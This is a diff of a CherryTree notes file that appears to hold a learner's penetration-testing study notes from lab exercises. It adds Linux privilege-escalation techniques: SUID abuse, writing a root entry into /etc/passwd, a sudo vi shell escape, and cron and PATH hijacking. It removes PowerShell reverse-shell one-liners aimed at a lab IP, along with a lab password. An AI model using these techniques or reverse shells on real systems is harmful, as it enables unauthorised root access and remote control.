@@ -163,7 +163,7 @@ intitle:</rich_text>
       <rich_text link="webs https://en.wikipedia.org/wiki/Google_hacking">https://en.wikipedia.org/wiki/Google_hacking</rich_text>
     </node>
   </node>
-  <node name="Linux Basics" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="115" is_bold="0" foreground="" ts_creation="1698759322" ts_lastsave="1699611957">
+  <node name="Linux Basics" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="115" is_bold="0" foreground="" ts_creation="1698759322" ts_lastsave="1699618949">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 list in tree view
@@ -211,7 +211,12 @@ alternative to cat -&gt; less
 list installed packages:
 </rich_text>
     <rich_text indent="1">apt list --installed</rich_text>
-    <node name="User Management" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695158810" ts_lastsave="1699440276">
+    <rich_text>
+
+list available shells:
+</rich_text>
+    <rich_text indent="1">cat /etc/shells</rich_text>
+    <node name="User Management" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695158810" ts_lastsave="1699618791">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 New user:
 </rich_text>
@@ -324,7 +329,7 @@ List normal users/groups:
       <rich_text indent="2">getent passwd {1000..60000}</rich_text>
       <rich_text>
 </rich_text>
-      <rich_text indent="2">getent passwd {1000..60000}</rich_text>
+      <rich_text indent="2">getent group {1000..60000}</rich_text>
     </node>
     <node name="Find" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1698759416" ts_lastsave="1699440269">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -2544,15 +2549,120 @@ Hashcat:
 </rich_text>
     </node>
   </node>
-  <node name="Privilige Escalation" unique_id="99" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699550864" ts_lastsave="1699612661">
+  <node name="Privilige Escalation" unique_id="99" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699550864" ts_lastsave="1699629914">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
-LINUX
+Useful links:
 </rich_text>
-    <rich_text indent="1">LinEnum:</rich_text>
+    <rich_text indent="1">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
+https://payatu.com/guide-linux-privilege-escalation</rich_text>
+    <rich_text>
+
+LinEnum:
+</rich_text>
+    <rich_text indent="1">wget </rich_text>
+    <rich_text indent="1" link="webs https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</rich_text>
+    <rich_text>
+
+Search for all SUID files:
+</rich_text>
+    <rich_text indent="1">find / -perm -u=s -type f 2&gt;/dev/null</rich_text>
+    <rich_text>
+execute file with SUID:</rich_text>
+    <rich_text indent="1">
+./</rich_text>
+    <rich_text indent="1" weight="heavy">FILE </rich_text>
+    <rich_text indent="1">-p</rich_text>
+    <rich_text>
+
+Write-able passwd file:
+</rich_text>
+    <rich_text indent="1">generate password hash:</rich_text>
     <rich_text>
 </rich_text>
-    <rich_text indent="2">wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</rich_text>
+    <rich_text indent="2">openssl passwd -1 -salt </rich_text>
+    <rich_text indent="2" weight="heavy">SALT</rich_text>
+    <rich_text indent="2"> </rich_text>
+    <rich_text weight="heavy">PASSWORD</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">create newline in passwd file for root user:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2" weight="heavy">USERNAME</rich_text>
+    <rich_text indent="2">:</rich_text>
+    <rich_text indent="2" weight="heavy">PASSWORD_HASH</rich_text>
+    <rich_text indent="2">:0:0:root:/root:/bin/bash</rich_text>
+    <rich_text>
+
+exploit binaries:
+</rich_text>
+    <rich_text indent="1">list commands user can run as root:</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">sudo -l</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">lookup the binary in: </rich_text>
+    <rich_text indent="1" link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">vi -&gt; sudo vi -c ':!/bin/sh' /dev/null</rich_text>
+    <rich_text>
+
+Crontab exploit:
+</rich_text>
+    <rich_text indent="1">cat /etc/crontab</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">look for scripts running as root</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">modify that script</rich_text>
+    <rich_text>
+
+PATH variable exploit:
+</rich_text>
+    <rich_text indent="1">Backup the original path</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">echo $PATH &gt; backup_path</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">identify a script running with root priviliges</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">identify which core commands it runs</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">cd /tmp</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">echo “/bin/bash” &gt; </rich_text>
+    <rich_text indent="1" weight="heavy">IMITATING_COMMAND</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">modify the path variable to the /tmp/ directory</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">export PATH=/tmp:$PATH</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">execute the script running with root priviliges</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="1">Reset</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text indent="2">export PATH=</rich_text>
+    <rich_text indent="2" weight="heavy">ORIGINAL_PATH</rich_text>
+    <rich_text indent="2">:$PATH</rich_text>
+    <rich_text>
+
+
+</rich_text>
   </node>
   <node name="Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1699550888">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
@@ -3414,15 +3524,15 @@ UPLOAD EXPLOITATION:
 </rich_text>
     <rich_text indent="2">Enumerate file length filters with the legitimate file. </rich_text>
   </node>
-  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1699550023">
-    <rich_text>10.10.183.218
+  <node name="Notes" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="18" is_bold="0" foreground="" ts_creation="1696093389" ts_lastsave="1699629845">
+    <rich_text>10.11.58.253
 =================
-10.10.117.183
-Username: Administrator
-Password: TryH4ckM3!
+10.10.24.28
 
-powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.183.218',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+ssh user3@10.10.24.28
+password
 
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.183.218',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</rich_text>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH</rich_text>
   </node>
 </cherrytree>
